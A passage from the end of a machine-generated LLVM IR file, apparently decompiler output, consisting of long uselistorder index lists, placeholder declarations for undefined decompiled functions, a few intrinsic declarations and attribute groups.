1243, 1244, 1245, 1246, 1238, 1239, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 1254, 1255, 1256, 37, 1257, 1258, 1259, 1260, 1261, 38, 1262, 1263, 1264, 1265, 1266, 39, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 179, 655, 513, 656, 657, 658, 659, 693, 393, 394, 694, 695, 129, 130, 131, 183, 660, 181, 661, 682, 675, 514, 676, 677, 678, 679, 44, 45, 89, 680, 681, 309, 683, 684, 515, 685, 180, 686, 46, 47, 88, 687, 688, 516, 689, 690, 48, 49, 87, 691, 182, 692, 132, 662, 517, 663, 664, 395, 665, 666, 518, 667, 668, 671, 669, 670, 310, 672, 50, 51, 91, 673, 519, 52, 53, 90, 674, 696, 520, 697, 698, 699, 700, 701, 702, 521, 703, 704, 705, 706, 586, 585, 313, 588, 589, 587, 311, 312, 590, 591, 396, 592, 594, 595, 522, 596, 597, 598, 523, 599, 600, 54, 55, 92, 601, 602, 603, 76, 77, 604, 605, 606, 184, 607, 608, 609, 610, 611, 397, 612, 613, 614, 615, 616, 617, 133, 620, 524, 621, 622, 56, 57, 94, 623, 624, 625, 525, 626, 627, 628, 629, 526, 630, 631, 58, 59, 93, 632, 633, 634, 635, 636, 185, 187, 618, 186, 619, 188, 637, 134, 707, 712, 713, 708, 709, 710, 715, 716, 717, 189, 718, 719, 720, 721, 722, 711, 714, 723, 135, 728, 729, 730, 190, 731, 732, 191, 736, 740, 741, 742, 743, 192, 737, 193, 738, 739, 136, 744, 1154, 1155, 1156, 194, 1157, 751, 750, 970, 971, 946, 746, 745, 747, 1282, 1283, 1284, 1285, 195, 1286, 1287, 1288, 972, 973, 322, 323, 398, 1293, 530, 1294, 399, 1295, 1296, 400, 1297, 1298, 528, 196, 315, 1299, 529, 1300, 401, 78, 1301, 1302, 402, 1317, 1318, 1321, 527, 314, 1322, 360, 138, 137, 1319, 1320, 1289, 1290, 531, 197, 293, 573, 13, 14, 1313, 840, 752, 1312, 947, 753, 109, 199, 754, 532, 198, 755, 756, 1303, 1304, 1305, 1306, 403, 1307, 139, 757, 758, 60, 61, 95, 974, 975, 83, 317, 979, 976, 977, 533, 978, 980, 534, 981, 982, 983, 984, 62, 63, 96, 985, 200, 986, 987, 988, 990, 989, 316, 574, 576, 575, 201, 577, 578, 579, 404, 580, 140, 1291, 1292, 141, 406, 407, 1308, 405, 142, 143, 996, 997, 998, 999, 1000, 202, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 203, 991, 408, 992, 993, 409, 994, 995, 144, 535, 204, 205, 1008, 410, 206, 1009, 1010, 1011, 1012, 1013, 145, 207, 209, 208, 211, 210, 212, 216, 215, 214, 213, 1014, 1015, 1039, 1040, 146, 1016, 1017, 220, 218, 219, 1018, 1019, 226, 225, 151, 217, 1020, 1021, 1022, 1023, 1024, 1025, 329, 328, 361, 411, 1026, 1027, 1028, 79, 1029, 222, 221, 223, 224, 150, 1030, 1031, 318, 1032, 1033, 114, 1034, 1035, 1036, 1037, 1038, 15, 16, 759, 760, 80, 17, 362, 412, 948, 949, 951, 950, 874, 873, 916, 915, 762, 761, 763, 764, 765, 918, 917, 875, 767, 766, 1071, 413, 952, 1309, 1310, 1311, 768, 770, 769, 771, 772, 773, 774, 775, 1314, 1315, 1316, 748, 18, 1158, 1159, 1160, 112, 1161, 1162, 1163, 1164, 1165, 227, 1166, 536, 539, 537, 538, 1167, 540, 228, 64, 229, 414, 776, 1056, 1055, 1057, 1058, 1059, 1060, 40, 230, 1061, 1062, 1063, 231, 104, 105, 369, 370, 749, 233, 232, 234, 777, 235, 778, 779, 236, 1041, 1042, 415, 237, 780, 238, 239, 953, 240, 954, 241, 242, 781, 243, 782, 783, 784, 788, 558, 566, 567, 569, 554, 106, 65, 296, 297, 555, 568, 556, 545, 557, 559, 546, 560, 547, 561, 548, 562, 549, 563, 550, 564, 551, 565, 570, 571, 416, 572, 113, 785, 541, 786, 417, 787, 320, 319, 789, 790, 791, 792, 245, 244, 793, 794, 795, 552, 294, 796, 99, 100, 295, 797, 97, 98, 418, 799, 800, 542, 801, 802, 803, 804, 805, 419, 806, 807, 808, 152, 544, 809, 810, 811, 543, 812, 813, 420, 814, 815, 818, 819, 820, 246, 816, 247, 817, 248, 798, 955, 956, 19, 821, 421, 822, 824, 249, 825, 826, 827, 828, 829, 830, 831, 251, 250, 832, 422, 833, 423, 834, 424, 823, 835, 330, 838, 252, 425, 839, 426, 836, 837, 427, 253, 254, 81, 255, 841, 842, 115, 116, 82, 843, 256, 257, 298, 844, 259, 845, 260, 258, 428, 846, 847, 849, 848, 850, 261, 851, 852, 363, 853, 854, 855, 262, 263, 856, 264, 857, 265, 858, 266, 859, 860, 107, 861, 862, 267, 863, 864, 865, 268, 867, 269, 299, 868, 866, 869, 870, 871, 270, 872, 876, 272, 878, 879, 271, 877, 880, 147, 430, 431, 881, 882, 432, 433, 883, 429, 884, 885, 273, 886, 887, 274, 275, 888, 889, 148, 890, 891, 20, 21, 22, 23, 892, 893, 276, 365, 894, 895, 434, 896, 435, 897, 436, 898, 437, 899, 438, 900, 439, 901, 364, 902, 440, 903, 904, 905, 277, 907, 908, 278, 300, 909, 906, 910, 911, 912, 24, 25, 26, 913, 279, 914, 919, 920, 66, 921, 280, 922, 923, 281, 301, 925, 924, 441, 926, 928, 929, 930, 931, 442, 932, 27, 28, 29, 927, 30, 31, 933, 282, 934, 935, 283, 938, 939, 940, 302, 941, 936, 937, 943, 942, 944, 284, 945, 957, 958, 285, 960, 961, 962, 286, 443, 964, 963, 959, 966, 967, 965, 968, 287, 969, 331, 1043, 149, 553, 444, 1044, 67, 1045, 117, 1046, 1047, 1048, 332, 1049, 445, 1050, 1051, 1052, 41, 321, 1053, 1054, 1064, 288, 1065, 1072, 289, 1073, 290, 1074, 1323, 366, 581, 367, 368, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 1324, 1325, 1326, 1327, 1328, 1329, 1330, 1331, 1332, 1333, 1334, 1335, 1336, 1337, 1338 }
  uselistorder i32* @r4, { 91, 779, 780, 781, 782, 783, 801, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 7, 798, 799, 800, 802, 803, 804, 805, 806, 807, 808, 809, 99, 100, 101, 102, 145, 8, 146, 147, 148, 9, 149, 150, 151, 152, 153, 154, 155, 0, 10, 156, 157, 158, 159, 160, 161, 162, 163, 222, 223, 231, 92, 810, 93, 94, 95, 812, 813, 814, 3, 817, 52, 811, 773, 774, 103, 104, 105, 106, 107, 108, 109, 110, 111, 818, 819, 164, 165, 11, 2, 166, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 12, 167, 168, 169, 170, 171, 172, 173, 174, 193, 13, 194, 195, 175, 176, 178, 14, 179, 182, 15, 183, 184, 16, 185, 186, 17, 187, 188, 18, 189, 190, 19, 191, 49, 192, 177, 196, 20, 197, 198, 199, 200, 201, 202, 203, 180, 181, 96, 97, 98, 112, 113, 114, 115, 21, 116, 22, 23, 117, 118, 119, 120, 121, 122, 123, 128, 129, 24, 130, 131, 25, 132, 133, 26, 134, 135, 27, 136, 137, 28, 138, 139, 29, 140, 141, 124, 125, 126, 127, 142, 143, 144, 204, 205, 206, 30, 207, 208, 209, 31, 210, 211, 212, 213, 214, 215, 47, 216, 217, 218, 219, 220, 221, 224, 225, 226, 227, 228, 229, 230, 232, 233, 234, 6, 235, 236, 237, 238, 815, 816, 243, 244, 245, 246, 247, 248, 661, 662, 836, 837, 838, 663, 664, 51, 842, 48, 843, 844, 845, 861, 863, 864, 865, 862, 846, 851, 859, 860, 839, 852, 853, 854, 855, 53, 54, 55, 249, 250, 4, 32, 251, 33, 252, 253, 254, 847, 848, 665, 83, 84, 85, 86, 87, 88, 840, 841, 849, 850, 239, 240, 241, 242, 666, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 34, 682, 683, 684, 685, 667, 668, 669, 686, 687, 688, 689, 690, 691, 692, 693, 694, 35, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 726, 727, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 50, 718, 719, 1, 720, 721, 722, 723, 724, 725, 255, 256, 257, 620, 621, 622, 623, 624, 627, 628, 629, 56, 625, 626, 472, 473, 474, 475, 476, 477, 478, 556, 557, 558, 561, 562, 563, 559, 560, 258, 259, 260, 261, 262, 263, 264, 57, 265, 266, 564, 565, 566, 567, 568, 569, 570, 267, 268, 269, 270, 271, 272, 273, 58, 274, 275, 276, 279, 280, 281, 277, 278, 282, 283, 284, 285, 286, 287, 856, 857, 858, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 630, 631, 632, 633, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 301, 302, 303, 304, 81, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 82, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 369, 370, 371, 372, 373, 374, 5, 363, 364, 365, 366, 367, 368, 319, 320, 321, 322, 634, 635, 636, 637, 638, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 394, 395, 396, 397, 398, 399, 388, 389, 390, 391, 392, 393, 89, 400, 401, 402, 403, 404, 411, 405, 406, 407, 408, 409, 410, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 36, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 37, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 38, 491, 39, 492, 40, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 41, 519, 42, 520, 43, 521, 44, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 45, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 639, 640, 641, 642, 46, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 763, 760, 761, 762, 764, 765, 766, 767, 768, 769, 770, 771, 772, 775, 776, 777, 90, 778 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64* @__decompiler_undefined_function_5() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_8() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_9() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
